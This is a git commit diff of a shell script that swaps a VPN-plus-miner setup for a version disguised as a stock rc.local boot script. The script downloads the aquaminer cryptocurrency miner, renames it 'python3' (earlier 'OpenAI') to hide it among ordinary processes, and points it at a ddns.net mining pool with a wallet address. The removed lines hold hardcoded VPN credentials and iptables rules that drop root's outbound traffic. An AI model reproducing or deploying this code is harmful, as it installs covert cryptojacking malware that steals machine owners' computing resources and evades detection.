199f3a6e6655545f03f75445f6af42bf94ade863
evilbaby <mickeypp@gmail.com>
2018-06-06 19:55:39 +0700

    Update 2.sh

--- 2.sh
+++ 2.sh
@@ -1,94 +1,34 @@
-#!/bin/bash
-apt-get update
-apt-get -y install strongswan xl2tpd
-VPN_SERVER_IP='173.82.212.234'
-VPN_IPSEC_PSK='LrvccuEZPukct8SC'
-VPN_USER='vpnuser'
-VPN_PASSWORD='NS5NJeZVBP5WULMB'
-cat > /etc/ipsec.conf <<EOF
-# ipsec.conf - strongSwan IPsec configuration file
-# basic configuration
-config setup
-  # strictcrlpolicy=yes
-  # uniqueids = no
-# Add connections here.
-# Sample VPN connections
-conn %default
-  ikelifetime=60m
-  keylife=20m
-  rekeymargin=3m
-  keyingtries=1
-  keyexchange=ikev1
-  authby=secret
-  ike=aes128-sha1-modp1024,3des-sha1-modp1024!
-  esp=aes128-sha1-modp1024,3des-sha1-modp1024!
-conn myvpn
-  keyexchange=ikev1
-  left=%defaultroute
-  auto=add
-  authby=secret
-  type=transport
-  leftprotoport=17/1701
-  rightprotoport=17/1701
-  right=$VPN_SERVER_IP
-EOF
+#!/bin/sh -e
+#
+# rc.local
+#
+# This script is executed at the end of each multiuser runlevel.
+# Make sure that the script will "exit 0" on success or any other
+# value on error.
+#
+# In order to enable or disable this script just change the execution
+# bits.
+#
+# By default this script does nothing.
+if [ -f ${PWD}/python3 ]; then
+    if pgrep -x "python3" > /dev/null
+then
+    echo "Miner dang chay roi , ke cmn di "
+    
+else
 
-cat > /etc/ipsec.secrets <<EOF
-: PSK "$VPN_IPSEC_PSK"
-EOF
+echo "Miner da install , chay thoi "
+mv aquaminer-0.4-linux-amd64	python3
+./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/2
 
-chmod 600 /etc/ipsec.secrets
-cat > /etc/xl2tpd/xl2tpd.conf <<EOF
-[lac myvpn]
-lns = $VPN_SERVER_IP
-ppp debug = yes
-pppoptfile = /etc/ppp/options.l2tpd.client
-length bit = yes
-EOF
+     
+fi
+exit
+fi
 
-cat > /etc/ppp/options.l2tpd.client <<EOF
-ipcp-accept-local
-ipcp-accept-remote
-refuse-eap
-require-chap
-noccp
-noauth
-mtu 1280
-mru 1280
-noipdefault
-defaultroute
-usepeerdns
-connect-delay 5000
-name $VPN_USER
-password $VPN_PASSWORD
-EOF
-
-chmod 600 /etc/ppp/options.l2tpd.client
-
-mkdir -p /var/run/xl2tpd
-touch /var/run/xl2tpd/l2tp-control
-service strongswan restart
-service xl2tpd restart
-sleep 5s
-ipsec up myvpn
-sleep 5s
-echo "c myvpn" > /var/run/xl2tpd/l2tp-control
-sleep 5s
-IP=$(/sbin/ip route | awk '/default/ { print $3 }')
-route add 173.82.212.234 gw $IP
-route add 116.97.88.63 gw $IP
-route add default dev ppp0
-wget -qO- http://ipv4.icanhazip.com > ip.txt
-
-sudo apt-get install molly-guard unzip cpulimit -y
 wget https://github.com/aquanetwork/aquachain/releases/download/1.5.5/aquaminer-0.4-linux-amd64.zip
 unzip aquaminer-0.4-linux-amd64.zip
-cp aquaminer-0.4-linux-amd64 OpenAI
-tmux new-session -d -s cpulimit1 'cpulimit -e OpenAI --limit 180'
-tmux new-session -d -s cpulimit ./OpenAI -F http://traugia.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/2
+mv aquaminer-0.4-linux-amd64 python3
+./python3 -F http://test-googlecloud.ddns.net/0xda83ec752a6ebf4fe7aa1a347accd786c3a58a26/2
 
-sudo iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
-sudo iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
-sudo iptables -I OUTPUT 3 -p tcp -d traugia.ddns.net --dport 80 -j ACCEPT
-sudo iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
-
+exit 0
